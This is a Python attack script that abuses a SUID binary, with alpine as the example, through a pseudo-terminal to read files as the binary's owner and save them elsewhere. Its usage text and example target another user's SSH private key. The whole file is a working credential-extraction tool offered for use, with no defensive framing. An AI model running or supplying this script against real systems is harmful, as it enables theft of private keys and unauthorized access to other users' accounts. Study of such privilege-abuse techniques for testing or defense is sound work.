#!/usr/bin/env python3
"""
Extract a file from the filesystem using a SUID binary via Python PTY.

Usage:
    python3 alpine_pty_extract.py <suid_binary> <target_file> <output_file>

Example:
    python3 alpine_pty_extract.py /usr/bin/alpine /home/user/.ssh/id_rsa /tmp/key.txt
"""

import pty
import os
import sys
import select
import time


def extract_file(suid_binary, target_file, output_file, timeout=10):
    """
    Use a SUID binary (like alpine) to read a file as its owner.
    
    Args:
        suid_binary: Path to the SUID binary (e.g., /usr/bin/alpine)
        target_file: File to read as SUID owner
        output_file: Where to save the extracted content
        timeout: Seconds to wait for output
    
    Returns:
        bool: True if extraction succeeded
    """
    master, slave = pty.openpty()
    pid = os.fork()
    
    if pid == 0:
        # Child process
        os.close(master)
        os.setsid()
        
        # Open the slave side
        sf = os.open(os.ttyname(slave), os.O_RDWR)
        os.dup2(sf, 0)
        os.dup2(sf, 1)
        os.dup2(sf, 2)
        if sf > 2:
            os.close(sf)
        os.close(slave)
        
        # Set environment for the SUID binary
        os.environ['HOME'] = '/dev/shm'  # Writable location for config files
        os.environ['TERM'] = 'xterm'
        
        # Execute SUID binary to view the target file
        os.execve(suid_binary, [suid_binary, '-F', target_file], os.environ)
        # Should not reach here
    
    # Parent process
    os.close(slave)
    
    out = open(output_file, 'wb')
    deadline = time.time() + timeout
    
    while time.time() < deadline:
        remaining = max(0, deadline - time.time())
        r, _, _ = select.select([master], [], [], remaining)
        if r:
            try:
                data = os.read(master, 8192)
                if not data:
                    break
                out.write(data)
                out.flush()
            except OSError:
                break
        else:
            break
    
    out.close()
    
    # Wait for child to finish
    try:
        os.waitpid(pid, 0)
    except OSError:
        pass
    
    # Check if we got any output
    if os.path.getsize(output_file) > 0:
        return True
    return False


if __name__ == '__main__':
    if len(sys.argv) != 4:
        print(f"Usage: {sys.argv[0]} <suid_binary> <target_file> <output_file>")
        print(f"Example: {sys.argv[0]} /usr/bin/alpine /home/user/.ssh/id_rsa /tmp/key.txt")
        sys.exit(1)
    
    suid_binary = sys.argv[1]
    target_file = sys.argv[2]
    output_file = sys.argv[3]
    
    if not os.path.exists(suid_binary):
        print(f"Error: SUID binary not found: {suid_binary}")
        sys.exit(1)
    
    print(f"Extracting {target_file} using {suid_binary}...")
    
    if extract_file(suid_binary, target_file, output_file):
        print(f"Success! Output saved to {output_file}")
        print(f"Size: {os.path.getsize(output_file)} bytes")
    else:
        print("Failed: No output captured")
        sys.exit(1)
